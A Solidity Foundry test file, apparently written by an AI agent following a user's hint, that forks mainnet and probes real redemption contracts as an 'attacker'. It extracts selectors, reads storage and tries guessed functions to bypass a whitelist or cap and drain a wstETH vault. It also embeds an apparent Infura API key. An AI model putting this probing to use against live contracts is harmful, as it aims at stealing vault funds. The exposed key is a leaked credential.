// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract SelectorDecoder is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_DecodeSuccessfulSelectors() public view {
        console.log("=== DECODING SUCCESSFUL SELECTORS ===\n");

        // Calculate known selector mappings
        console.log("Known selectors:");
        console.log("treasury()");
        console.logBytes4(bytes4(keccak256("treasury()")));
        console.log("pendingOwner()");
        console.logBytes4(bytes4(keccak256("pendingOwner()")));
        console.log("redemptionController()");
        console.logBytes4(bytes4(keccak256("redemptionController()")));
        console.log("vault()");
        console.logBytes4(bytes4(keccak256("vault()")));
        console.log("convertToAssets(uint256)");
        console.logBytes4(bytes4(keccak256("convertToAssets(uint256)")));
        console.log("previewRedeem(uint256)");
        console.logBytes4(bytes4(keccak256("previewRedeem(uint256)")));

        // Working selectors from REDEMPTION_1:
        // 0xc5d664c6 = ?
        // 0xfd424ea8 = ?
        // 0xe30c3978 = pendingOwner()
        // 0x9307e802 = ?
        // 0x411557d1 = ?
        // 0x51cbf345 = ?
        // 0x61d027b3 = treasury()
        // 0x458f5815 = ?
        // 0x252c50f3 = ?
        // 0x38a63183 = ?
        // 0x06e29712 = ?
        // 0x1650cf97 = ?
    }

    function test_CallSuccessfulSelectorsWithReturn() public view {
        console.log("=== CALLING SUCCESSFUL SELECTORS ===\n");

        bytes4[] memory selectors = new bytes4[](12);
        selectors[0] = bytes4(0xc5d664c6);
        selectors[1] = bytes4(0xfd424ea8);
        selectors[2] = bytes4(0xe30c3978); // pendingOwner()
        selectors[3] = bytes4(0x9307e802);
        selectors[4] = bytes4(0x411557d1);
        selectors[5] = bytes4(0x51cbf345);
        selectors[6] = bytes4(0x61d027b3); // treasury()
        selectors[7] = bytes4(0x458f5815);
        selectors[8] = bytes4(0x252c50f3);
        selectors[9] = bytes4(0x38a63183);
        selectors[10] = bytes4(0x06e29712);
        selectors[11] = bytes4(0x1650cf97);

        for (uint i = 0; i < selectors.length; i++) {
            // Try as view function returning address
            (bool success, bytes memory data) = REDEMPTION_1.staticcall(
                abi.encodeWithSelector(selectors[i])
            );

            console.log("\nSelector:");
            console.logBytes4(selectors[i]);

            if (success && data.length >= 32) {
                // Try to decode as address
                address result = abi.decode(data, (address));
                console.log("  Returns address:", result);
                if (result.code.length > 0) {
                    console.log("  (contract, code size:", result.code.length, ")");
                }
            } else if (success && data.length > 0) {
                console.log("  Returns bytes of length:", data.length);
            } else {
                console.log("  Failed or no data");
            }
        }
    }

    function test_CheckRedemption0Selectors() public view {
        console.log("=== REDEMPTION_0 SELECTORS ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Find unique selectors
        bytes4[] memory uniqueSelectors = new bytes4[](100);
        uint uniqueCount = 0;

        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));

                // Filter out common non-function patterns
                if (sel == 0xffffffff) continue;

                // Check if unique
                bool isUnique = true;
                for (uint j = 0; j < uniqueCount; j++) {
                    if (uniqueSelectors[j] == sel) {
                        isUnique = false;
                        break;
                    }
                }

                if (isUnique && uniqueCount < 100) {
                    uniqueSelectors[uniqueCount] = sel;
                    uniqueCount++;
                }
            }
        }

        console.log("Unique selectors in REDEMPTION_0:", uniqueCount);
        for (uint i = 0; i < uniqueCount && i < 50; i++) {
            console.log(i, ":");
            console.logBytes4(uniqueSelectors[i]);
        }
    }

    function test_TryRedemption0Functions() public {
        console.log("=== TRYING REDEMPTION_0 FUNCTIONS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        deal(IAU, attacker, 100000e18);

        // From REDEMPTION_0 selectors we need to find:
        // - A function that creates redemption request
        // - A function that finalizes and calls RC.redeem

        // Known selectors:
        // redeem(uint96) = 0x7630c4a8
        // finalizeRedeem(uint256) = 0xaff6cbf1

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Try to find a function that bypasses whitelist/cap
        bytes4[] memory toTry = new bytes4[](15);
        toTry[0] = bytes4(keccak256("redeemUncapped(uint96)"));
        toTry[1] = bytes4(keccak256("redeemForce(uint96)"));
        toTry[2] = bytes4(keccak256("redeemAll()"));
        toTry[3] = bytes4(keccak256("redeemMax()"));
        toTry[4] = bytes4(keccak256("instantRedeem(uint96)"));
        toTry[5] = bytes4(keccak256("emergencyRedeem(uint96)"));
        toTry[6] = bytes4(keccak256("executeRedeem(uint256)"));
        toTry[7] = bytes4(keccak256("processRedeem(uint256)"));
        toTry[8] = bytes4(keccak256("completeRedeem(uint256)"));
        toTry[9] = bytes4(keccak256("claimRedeem(uint256)"));
        toTry[10] = bytes4(keccak256("withdrawRedeem(uint256)"));
        toTry[11] = bytes4(keccak256("settleRedeem(uint256)"));
        toTry[12] = bytes4(keccak256("fulfill(uint256)"));
        toTry[13] = bytes4(keccak256("claim(uint256)"));
        toTry[14] = bytes4(keccak256("withdraw(uint256)"));

        console.log("\nTrying bypass functions:");
        for (uint i = 0; i < toTry.length; i++) {
            (bool success,) = REDEMPTION_0.call{gas: 500000}(
                abi.encodeWithSelector(toTry[i], uint96(100e18))
            );
            if (success) {
                console.log("SUCCESS:");
                console.logBytes4(toTry[i]);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** FOUND BYPASS! ***");
        }
    }

    function test_LookForActionChaining() public view {
        console.log("=== LOOKING FOR ACTION CHAINING ===\n");

        // The user hint was about "action chaining"
        // This might mean:
        // 1. Multiple contract calls chained together
        // 2. A DeFiSaver-style action system
        // 3. A callback mechanism

        // Let's look for action/execute/chain patterns
        console.log("Calculating action-related selectors:");
        console.log("executeAction(bytes,bytes32[],uint8[],bytes32[])");
        console.logBytes4(bytes4(keccak256("executeAction(bytes,bytes32[],uint8[],bytes32[])")));
        console.log("execute(address,bytes)");
        console.logBytes4(bytes4(keccak256("execute(address,bytes)")));
        console.log("multicall(bytes[])");
        console.logBytes4(bytes4(keccak256("multicall(bytes[])")));
        console.log("callback(address,bytes)");
        console.logBytes4(bytes4(keccak256("callback(address,bytes)")));
    }

    function test_InvestigateEpochCap() public view {
        console.log("=== INVESTIGATING EPOCH CAP ===\n");

        // Error 0xa0927dc3 is the epoch cap error
        // Let's see what the cap is and if we can work around it

        // Try to find the cap value in storage
        console.log("REDEMPTION_0 storage (looking for cap):");
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            console.log("  Slot", i, ":");
            console.logBytes32(slot);
        }

        // Slot 3 had: 0x0000000000000000002710000000000000000000000000000000000000000000
        // 0x2710 = 10000 (probably 10000 * 1e18 = 10000 IAU cap?)

        // Slot 4 had: 0x00000005000000350e9ec117defc5dc000093a800000000ad78ebc5ac6200000
        // This is packed data with multiple values
    }
}
